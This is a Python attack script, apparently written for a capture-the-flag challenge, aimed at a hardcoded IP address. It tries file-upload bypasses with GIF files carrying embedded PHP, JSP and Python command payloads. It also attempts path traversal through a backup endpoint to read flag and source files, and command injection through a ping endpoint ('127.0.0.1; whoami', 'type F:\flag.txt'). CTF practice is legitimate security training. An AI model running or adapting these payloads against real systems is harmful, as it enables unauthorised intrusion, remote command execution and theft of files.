import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})

# 移除代理
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def analyze_source_code():
    print_section("1. 分析上传源码")
    
    url = f"{TARGET}/upload-source"
    r = session.get(url, timeout=TIMEOUT)
    
    source = r.text
    
    allowed_uploads = re.search(r'ALLOWED_UPLOADS\s*=\s*\{([^}]+)\}', source)
    if allowed_uploads:
        print(f"\n  ALLOWED_UPLOADS配置:\n{allowed_uploads.group(1)}")
    
    allowed_extensions = re.search(r'ALLOWED_UPLOAD_EXTENSIONS\s*=\s*\{([^}]+)\}', source)
    if allowed_extensions:
        print(f"\n  ALLOWED_UPLOAD_EXTENSIONS:\n{allowed_extensions.group(1)}")


def test_upload_validation_bypass():
    print_section("2. 测试上传验证绕过")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    gif_with_php_upper = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?PHP system('whoami');?>"
    
    gif_with_split_php = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?php" + b" " + b"system('whoami');?>"
    
    gif_with_comment_php = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?php /* test */ system('whoami');?>"
    
    gif_with_newline_php = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?\nphp system('whoami');?>"
    
    gif_with_jsp = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<% out.println('test'); %>"
    
    gif_with_python = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;#!python\nexec('import os; print(os.system(\"whoami\"))')"
    
    test_files = [
        ("test_upper.gif", "image/gif", gif_with_php_upper),
        ("test_split.gif", "image/gif", gif_with_split_php),
        ("test_comment.gif", "image/gif", gif_with_comment_php),
        ("test_newline.gif", "image/gif", gif_with_newline_php),
        ("test_jsp.gif", "image/gif", gif_with_jsp),
        ("test_python.gif", "image/gif", gif_with_python),
    ]
    
    for filename, content_type, content in test_files:
        try:
            files = {"file": (filename, content, content_type)}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        print(f"\n  🎉 上传成功: {filename} -> /uploads/{uploaded_name.group(1)}")
                        r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                        print(f"     内容: {r2.text[:200]}")
                else:
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ {filename}: {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_backup_deep():
    print_section("3. 深入测试Backup")
    
    backup_url = f"{TARGET}/backup"
    
    backup_payloads = [
        "F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\flag",
        "F:\\small peoject\\python-lab\\app.py",
        "F:\\small peoject\\python-lab\\main.py",
        "F:\\small peoject\\python-lab\\config.py",
        "F:\\flag.txt",
        "F:\\flag",
        "C:\\flag.txt",
        "C:\\flag",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 20:
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_ping_deep():
    print_section("4. 深入测试Ping")
    
    ping_url = f"{TARGET}/ping"
    
    ping_payloads = [
        "127.0.0.1; type F:\\small peoject\\python-lab\\flag.txt",
        "127.0.0.1; type F:\\flag.txt",
        "127.0.0.1; type C:\\flag.txt",
        "127.0.0.1; dir F:\\",
        "127.0.0.1; dir C:\\",
        "127.0.0.1; whoami",
        "127.0.0.1; ipconfig",
        "localhost; type F:\\flag.txt",
        "127.1; type F:\\flag.txt",
        "0; type F:\\flag.txt",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 100:
                        print(f"\n  [{r.status_code}] ?host={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞分析")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    analyze_source_code()
    test_upload_validation_bypass()
    test_backup_deep()
    test_ping_deep()
    
    print_section("分析完成")


if __name__ == "__main__":
    main()